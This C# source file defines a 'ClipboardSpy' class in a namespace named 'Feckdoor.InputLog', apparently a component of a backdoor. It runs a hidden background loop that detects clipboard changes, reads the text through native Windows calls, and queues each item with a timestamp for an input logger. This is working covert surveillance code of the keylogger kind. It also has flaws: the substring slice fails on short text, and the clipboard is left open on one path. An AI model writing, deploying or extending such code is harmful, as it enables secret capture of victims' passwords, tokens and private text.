using Serilog;
using System.Runtime.InteropServices;

namespace Feckdoor.InputLog
{
	public class ClipboardSpy : IDisposable
	{
		protected readonly CancellationTokenSource cancel;

		private int PrevSequenceNum = 0;
		private bool disposed;

		public ClipboardSpy()
		{
			cancel = new CancellationTokenSource();
			Task.Run(async () => await ClipboardSpyProc(cancel.Token));
		}

		private async Task ClipboardSpyProc(CancellationToken ct)
		{
			while (!ct.IsCancellationRequested)
			{
				int newSeqNum = User32.GetClipboardSequenceNumber();
				if (PrevSequenceNum != newSeqNum)
				{
					string? Data = GetClipboardDataNative();
					if (Data != null)
						InputLogger.UndoneQueue.Enqueue(new ClipboardChangeEntry(DateTime.Now, Data[..100]));
				}
				PrevSequenceNum = newSeqNum;
				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay, ct);
			}
		}

		private static unsafe string? GetClipboardDataNative()
		{
			try
			{
				User32.OpenClipboard(IntPtr.Zero);
				uint filter = User32.CF_UNICODETEXT;

				if (User32.GetPriorityClipboardFormat(&filter, 1) == User32.CF_UNICODETEXT)
				{
					IntPtr clipHandle = User32.GetClipboardData(User32.CF_UNICODETEXT);
					string? clipString = null;
					if (clipHandle != IntPtr.Zero)
					{
						clipString = new string((char*)Kernel32.GlobalLock(clipHandle));
						Kernel32.GlobalUnlock(clipHandle);
					}
					User32.CloseClipboard();
					return clipString;
				}
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during native clipboard access.");
			}

			return null;
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposed)
			{
				cancel.Cancel();
				disposed = true;
			}
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}
}
